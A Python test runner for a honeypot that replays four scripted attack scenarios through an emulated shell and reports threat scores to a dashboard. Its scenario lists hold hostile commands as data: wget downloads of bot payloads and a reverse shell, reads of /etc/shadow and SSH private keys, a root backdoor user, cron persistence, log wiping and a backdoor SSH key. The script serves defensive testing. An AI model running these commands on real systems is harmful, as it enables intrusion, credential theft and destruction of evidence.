"""Realistic Attack Scenario Runner.

Simulates real-world attack patterns with human-like timing through the
full honeypot pipeline, pushing live telemetry to the dashboard.

Each scenario runs 30-60+ seconds with variable delays between commands,
simulating how actual attackers and botnets behave.

Usage:
    # Terminal 1 — backend
    python -m uvicorn dashboard.app:app --port 8080

    # Terminal 2 — frontend
    npm run dev

    # Terminal 3 — run a scenario
    python scripts/attack_scenarios.py --scenario botnet
    python scripts/attack_scenarios.py --scenario credential
    python scripts/attack_scenarios.py --scenario privesc
    python scripts/attack_scenarios.py --scenario persistence
    python scripts/attack_scenarios.py --scenario all         # run all 4 as parallel sessions
    python scripts/attack_scenarios.py --list                 # show available scenarios

Flags:
    --scenario NAME     Which scenario to run (or 'all')
    --speed FLOAT       Timing multiplier: 0.5 = fast, 1.0 = normal, 2.0 = slow
    --list              List available scenarios and exit
    --no-dashboard      Skip dashboard connection
"""
from __future__ import annotations

import argparse
import random
import sys
import threading
import time
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import List, Tuple

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

import requests
from honeypot.cowrie_hook import create_dispatcher
from event_logging.session_logger import SessionLogger

# ---------------------------------------------------------------------------
# ANSI
# ---------------------------------------------------------------------------
RESET   = "\033[0m"
BOLD    = "\033[1m"
DIM     = "\033[2m"
GREEN   = "\033[32m"
YELLOW  = "\033[33m"
RED     = "\033[31m"
CYAN    = "\033[36m"
MAGENTA = "\033[35m"
ORANGE  = "\033[38;5;208m"
WHITE   = "\033[37m"

LEVEL_COLORS = {"low": GREEN, "medium": YELLOW, "high": ORANGE, "critical": RED}
DASHBOARD_URL = "http://127.0.0.1:8080"


def _post(endpoint: str, data: dict) -> bool:
    try:
        r = requests.post(f"{DASHBOARD_URL}{endpoint}", json=data, timeout=2)
        return r.status_code == 200
    except Exception:
        return False


def _dashboard_alive() -> bool:
    try:
        return requests.get(f"{DASHBOARD_URL}/api/stats", timeout=2).status_code == 200
    except Exception:
        return False


def _level(score: int) -> str:
    if score >= 85: return "critical"
    if score >= 60: return "high"
    if score >= 30: return "medium"
    return "low"


# ---------------------------------------------------------------------------
# Attack command definitions
# ---------------------------------------------------------------------------
@dataclass
class AttackStep:
    command: str
    delay_before: float  # seconds to wait BEFORE executing this command
    description: str = ""


@dataclass
class AttackScenario:
    name: str
    title: str
    description: str
    attacker_ip: str
    steps: List[AttackStep] = field(default_factory=list)
    color: str = GREEN


# ---------------------------------------------------------------------------
# Scenario 1: Mirai/IoT Botnet — Download & Execute
# Modeled after real Mirai variant behavior: fast, scripted, no exploration.
# These bots hit, download, execute, and move on in under 30 seconds.
# ---------------------------------------------------------------------------
BOTNET = AttackScenario(
    name="botnet",
    title="Mirai/IoT Botnet — Download & Execute",
    description="Automated bot: fast recon, download payload, execute, clean up. "
                "This is what 95% of real honeypot traffic looks like (MPI study).",
    attacker_ip="185.220.101.42",
    color=RED,
    steps=[
        AttackStep("uname -a",                              0.3, "Fingerprint the OS"),
        AttackStep("cat /proc/cpuinfo",                     0.5, "Check architecture (ARM? x86?)"),
        AttackStep("whoami",                                0.2, "Confirm access level"),
        AttackStep("cd /tmp",                               0.3, "Move to writable directory"),
        AttackStep("ls -la",                                0.4, "Check what's here"),
        AttackStep("wget http://45.9.148.99/bins/x86.bot",  0.8, "Download botnet payload"),
        AttackStep("chmod +x x86.bot",                      0.3, "Make executable"),
        AttackStep("./x86.bot",                             0.4, "Execute the payload"),
        AttackStep("rm -f x86.bot",                         0.3, "Remove evidence"),
        AttackStep("history -c",                            0.2, "Clear command history"),
        AttackStep("cat /proc/version",                     1.0, "Second wave: more fingerprinting"),
        AttackStep("free -m",                               0.5, "Check available memory"),
        AttackStep("wget http://45.9.148.99/bins/scan.sh",  0.6, "Download scanner module"),
        AttackStep("chmod +x scan.sh",                      0.3, "Make scanner executable"),
        AttackStep("./scan.sh",                             0.4, "Run network scanner"),
    ],
)

# ---------------------------------------------------------------------------
# Scenario 2: Credential Harvesting — Human Attacker
# Modeled after documented SSH brute-force-then-explore patterns.
# Slower, more deliberate, reads files carefully.
# ---------------------------------------------------------------------------
CREDENTIAL = AttackScenario(
    name="credential",
    title="Credential Harvesting — SSH Key Theft",
    description="Human attacker: methodical exploration, reads sensitive files, "
                "harvests credentials and SSH keys for lateral movement.",
    attacker_ip="61.177.173.12",
    color=MAGENTA,
    steps=[
        AttackStep("whoami",                           1.5, "Who am I?"),
        AttackStep("id",                               2.0, "What groups do I belong to?"),
        AttackStep("ls -la /home",                     1.8, "Check for other users"),
        AttackStep("cat /etc/passwd",                  3.0, "Enumerate all users"),
        AttackStep("cat /etc/shadow",                  2.5, "Try to read password hashes"),
        AttackStep("ls -la ~/.ssh",                    2.0, "Check SSH directory"),
        AttackStep("cat ~/.ssh/id_rsa",                3.5, "Steal private SSH key"),
        AttackStep("cat ~/.ssh/authorized_keys",       2.0, "Check authorized keys"),
        AttackStep("cat ~/.ssh/known_hosts",           1.5, "Map SSH connections"),
        AttackStep("ls -la /home",                     2.0, "Look for other user dirs"),
        AttackStep("cat /etc/group",                   1.8, "Check group memberships"),
        AttackStep("env",                              2.5, "Check environment for secrets"),
        AttackStep("cat ~/.bash_history",              3.0, "Read command history for creds"),
        AttackStep("find / -name '*.pem' -type f",     4.0, "Search for SSL certificates"),
        AttackStep("find / -name '.env' -type f",      3.5, "Search for .env files with secrets"),
        AttackStep("cat /etc/hostname",                1.0, "Confirm hostname"),
        AttackStep("netstat -tulpn",                   2.0, "Check listening services"),
    ],
)

# ---------------------------------------------------------------------------
# Scenario 3: Privilege Escalation Chain
# Modeled after GTFOBins / LinPEAS enumeration flows.
# Attacker systematically checks every escalation vector.
# ---------------------------------------------------------------------------
PRIVESC = AttackScenario(
    name="privesc",
    title="Privilege Escalation — Systematic Enumeration",
    description="Skilled attacker: methodically enumerates sudo, SUID binaries, "
                "cron jobs, writable dirs, and kernel version for exploit matching.",
    attacker_ip="92.118.39.84",
    color=ORANGE,
    steps=[
        AttackStep("id",                                    1.0, "Check current privileges"),
        AttackStep("uname -a",                              1.5, "Kernel version for exploit DB"),
        AttackStep("cat /etc/os-release",                   2.0, "OS version details"),
        AttackStep("sudo -l",                               3.0, "What can I sudo?"),
        AttackStep("find / -perm -4000 -type f",            4.0, "Find SUID binaries"),
        AttackStep("cat /etc/crontab",                      2.5, "Check cron jobs for writable scripts"),
        AttackStep("ls -la /etc/cron.d/",                   1.5, "Check cron.d directory"),
        AttackStep("cat /etc/sudoers",                      3.0, "Try to read sudoers directly"),
        AttackStep("find / -writable -type d",              3.5, "Find world-writable directories"),
        AttackStep("ps aux",                                2.0, "Check running processes"),
        AttackStep("ls -la /var/spool/cron/",               1.8, "Check user cron spool"),
        AttackStep("cat /proc/version",                     1.5, "Kernel details for exploit match"),
        AttackStep("chmod 777 /tmp",                        2.0, "Ensure /tmp is writable"),
        AttackStep("cat /etc/passwd",                       2.5, "Re-check users for su targets"),
        AttackStep("su root",                               3.0, "Try to switch to root"),
        AttackStep("sudo su",                               2.5, "Try sudo su"),
        AttackStep("sudo bash",                             2.0, "Try spawning root shell"),
    ],
)

# ---------------------------------------------------------------------------
# Scenario 4: Persistence & Anti-Forensics
# Modeled after post-exploitation frameworks (Metasploit, Cobalt Strike).
# Attacker has access and is establishing long-term persistence.
# ---------------------------------------------------------------------------
PERSISTENCE = AttackScenario(
    name="persistence",
    title="Persistence & Anti-Forensics — Post-Exploitation",
    description="Post-exploitation: attacker establishes backdoor, modifies "
                "logs, adds cron persistence, and covers tracks.",
    attacker_ip="5.188.206.18",
    color=RED,
    steps=[
        AttackStep("whoami",                                        1.0, "Confirm access"),
        AttackStep("id",                                            0.8, "Check privilege level"),
        AttackStep("cat /etc/passwd",                               2.0, "Map users"),
        AttackStep("echo 'backdoor:x:0:0::/root:/bin/bash' >> /etc/passwd", 3.0,
                   "Add backdoor user"),
        AttackStep("mkdir -p /tmp/.hidden",                         1.5, "Create hidden directory"),
        AttackStep("wget http://10.0.0.5/reverse_shell.py",        2.5, "Download reverse shell"),
        AttackStep("chmod +x /tmp/.hidden/reverse_shell.py",       1.0, "Make executable"),
        AttackStep("crontab -l",                                    2.0, "Check existing cron"),
        AttackStep("echo '*/5 * * * * /tmp/.hidden/reverse_shell.py' | crontab -", 3.5,
                   "Add cron persistence"),
        AttackStep("cat /var/log/auth.log",                         2.5, "Check auth logs"),
        AttackStep("echo '' > /var/log/auth.log",                   2.0, "Clear auth logs"),
        AttackStep("echo '' > /var/log/syslog",                     1.5, "Clear syslog"),
        AttackStep("rm -rf /var/log/wtmp",                          1.8, "Remove login records"),
        AttackStep("history -c",                                    1.0, "Clear history"),
        AttackStep("unset HISTFILE",                                0.8, "Disable history logging"),
        AttackStep("cat ~/.ssh/authorized_keys",                    2.0, "Check SSH keys"),
        AttackStep("echo 'ssh-rsa AAAA...backdoor-key' >> ~/.ssh/authorized_keys", 3.0,
                   "Add backdoor SSH key"),
        AttackStep("netstat -tulpn",                                2.0, "Final service check"),
    ],
)

ALL_SCENARIOS = {
    "botnet": BOTNET,
    "credential": CREDENTIAL,
    "privesc": PRIVESC,
    "persistence": PERSISTENCE,
}


# ---------------------------------------------------------------------------
# Runner
# ---------------------------------------------------------------------------
def run_scenario(
    scenario: AttackScenario,
    speed: float,
    dashboard_ok: bool,
    thread_prefix: str = "",
    lock: threading.Lock | None = None,
) -> None:
    """Execute a single attack scenario."""
    prefix = f"[{thread_prefix}] " if thread_prefix else ""

    def tprint(msg: str) -> None:
        line = f"  {prefix}{msg}"
        if lock:
            with lock:
                print(line)
        else:
            print(line)

    # Create dispatcher
    sess_logger = SessionLogger(
        log_dir=str(PROJECT_ROOT / "event_logging" / "logs"),
        logger_name=f"attack_{scenario.name}",
    )
    dispatcher = create_dispatcher(
        attacker_ip=scenario.attacker_ip,
        attacker_port=random.randint(30000, 60000),
        persona_name="generic_linux",
        session_logger=sess_logger,
    )
    sid = dispatcher.session_id

    if dashboard_ok:
        _post("/api/session/start", {
            "session_id": sid,
            "attacker_ip": scenario.attacker_ip,
            "persona": "generic_linux",
        })

    tprint(f"{scenario.color}{BOLD}{scenario.title}{RESET}")
    tprint(f"{DIM}{scenario.description}{RESET}")
    tprint(f"{DIM}IP: {scenario.attacker_ip} | Session: {sid[:8]}{RESET}")
    tprint(f"{DIM}{'-' * 55}{RESET}")

    prev_persona = "generic_linux"
    start_time = time.time()

    for i, step in enumerate(scenario.steps, 1):
        delay = step.delay_before * speed
        # Add human-like jitter (+/- 30%)
        delay *= random.uniform(0.7, 1.3)
        time.sleep(delay)

        prompt = dispatcher.prompt
        tprint(f"{GREEN}{prompt}{RESET}{BOLD}{step.command}{RESET}")
        if step.description:
            tprint(f"{DIM}  # {step.description}{RESET}")

        response, source = dispatcher.dispatch(step.command)

        # Show response (truncated)
        resp_lines = response.strip().splitlines()
        for line in resp_lines[:3]:
            tprint(f"{DIM}  {line[:80]}{RESET}")
        if len(resp_lines) > 3:
            tprint(f"{DIM}  ... ({len(resp_lines) - 3} more lines){RESET}")

        # Threat info
        session = dispatcher.session
        score = session.threat_score
        level = _level(score)
        history = session.command_history
        last = history[-1] if history else {}
        delta = last.get("score_delta", 0)
        category = last.get("category", "benign")
        persona = dispatcher.persona_name

        lc = LEVEL_COLORS.get(level, GREEN)
        delta_str = f"+{delta}" if delta > 0 else str(delta)
        tprint(f"{lc}  Score: {score}/100 ({delta_str}) [{level.upper()}]{RESET}")

        # Persona switch
        if persona != prev_persona:
            tprint(f"{BOLD}{ORANGE}  >>> PERSONA SWITCH: {prev_persona} -> {persona}{RESET}")
            if dashboard_ok:
                _post("/api/session/switch", {
                    "session_id": sid,
                    "from_persona": prev_persona,
                    "to_persona": persona,
                    "trigger_score": score,
                })
            prev_persona = persona

        # Push to dashboard
        if dashboard_ok:
            _post("/api/session/command", {
                "session_id": sid,
                "command": step.command,
                "score_after": score,
                "score_delta": delta,
                "category": category,
                "threat_level": level,
                "persona": persona,
                "response_source": source,
            })

        tprint("")

    elapsed = time.time() - start_time
    dispatcher.close()
    if dashboard_ok:
        _post("/api/session/end", {"session_id": sid})

    tprint(f"{BOLD}{scenario.color}{'=' * 40}{RESET}")
    tprint(f"{BOLD}  Scenario: {scenario.title}{RESET}")
    tprint(f"  Commands : {len(scenario.steps)}")
    lc = LEVEL_COLORS.get(level, GREEN)
    tprint(f"  Score    : {lc}{score}/100 ({level.upper()}){RESET}")
    tprint(f"  Persona  : {persona}")
    tprint(f"  Duration : {elapsed:.1f}s")
    tprint(f"{BOLD}{scenario.color}{'=' * 40}{RESET}")
    tprint("")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def main() -> None:
    parser = argparse.ArgumentParser(description="Attack Scenario Runner")
    parser.add_argument("--scenario", default="botnet",
                        help="Scenario name or 'all' (default: botnet)")
    parser.add_argument("--speed", type=float, default=1.0,
                        help="Timing multiplier: 0.5=fast, 1.0=normal, 2.0=slow")
    parser.add_argument("--list", action="store_true", help="List scenarios")
    parser.add_argument("--no-dashboard", action="store_true")
    args = parser.parse_args()

    if args.list:
        print(f"\n{BOLD}Available Attack Scenarios:{RESET}\n")
        for name, sc in ALL_SCENARIOS.items():
            print(f"  {CYAN}{name:15s}{RESET} {sc.title}")
            print(f"  {DIM}{' ' * 15} {sc.description}{RESET}")
            print(f"  {DIM}{' ' * 15} {len(sc.steps)} commands, IP: {sc.attacker_ip}{RESET}")
            print()
        print(f"  {CYAN}{'all':15s}{RESET} Run all 4 scenarios as simultaneous sessions")
        print(f"\n  Usage: python scripts/attack_scenarios.py --scenario <name>\n")
        return

    # Banner
    print(f"\n{BOLD}{RED}{'=' * 64}")
    print(f"  ATTACK SCENARIO RUNNER")
    print(f"  Realistic attack patterns through the full honeypot pipeline")
    print(f"{'=' * 64}{RESET}\n")

    dashboard_ok = False
    if not args.no_dashboard:
        dashboard_ok = _dashboard_alive()
        if dashboard_ok:
            print(f"  {GREEN}[+] Dashboard connected{RESET}")
            _post("/api/dashboard/clear", {})
            _post("/api/fingerprint", {"score": 19, "total": 22})
            time.sleep(0.5)
        else:
            print(f"  {YELLOW}[!] Dashboard not running — console only{RESET}")

    print()

    if args.scenario == "all":
        # Run all scenarios as parallel sessions
        print(f"  {BOLD}Running ALL scenarios as simultaneous attacker sessions...{RESET}\n")
        lock = threading.Lock()
        threads = []
        for name, sc in ALL_SCENARIOS.items():
            t = threading.Thread(
                target=run_scenario,
                args=(sc, args.speed, dashboard_ok, name.upper(), lock),
                daemon=True,
            )
            threads.append(t)

        for t in threads:
            t.start()
            time.sleep(1.5)  # stagger session starts

        for t in threads:
            t.join()

    elif args.scenario in ALL_SCENARIOS:
        run_scenario(ALL_SCENARIOS[args.scenario], args.speed, dashboard_ok)
    else:
        print(f"  {RED}Unknown scenario: {args.scenario}{RESET}")
        print(f"  Available: {', '.join(ALL_SCENARIOS.keys())}, all")
        print(f"  Run with --list to see details")
        return

    print(f"\n{BOLD}  All scenarios complete.{RESET}\n")


if __name__ == "__main__":
    main()
